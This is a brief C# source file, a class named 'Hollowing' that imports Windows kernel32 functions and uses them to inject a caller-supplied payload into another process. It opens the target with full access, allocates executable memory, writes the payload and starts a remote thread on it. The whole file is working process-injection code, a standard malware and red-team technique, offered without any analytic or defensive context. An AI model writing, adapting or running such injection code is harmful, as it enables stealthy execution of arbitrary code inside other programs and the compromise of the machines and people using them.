using System;
using System.Runtime.InteropServices;

public class Hollowing {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    public static void Execute(int pid, byte[] payload) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, (uint)pid);
        IntPtr mem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
        WriteProcessMemory(hProcess, mem, payload, (uint)payload.Length, out uint written);
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out uint threadId);
    }
}
